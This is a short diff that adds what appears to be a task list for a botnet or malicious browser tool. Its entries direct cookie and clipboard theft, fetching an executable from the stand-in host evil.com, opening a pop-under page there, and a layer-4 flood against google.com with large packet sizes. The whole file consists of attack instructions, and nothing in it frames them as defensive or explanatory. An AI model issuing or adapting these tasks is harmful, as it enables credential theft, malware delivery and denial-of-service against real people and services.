@@ -1,0 +1,5 @@
+cookie
+clipboard
+exploit*http://evil.com/evil.exe*
+popunder*http://evil.com/evil.html*
+layer4*http://google.com/*8192-65507*0*
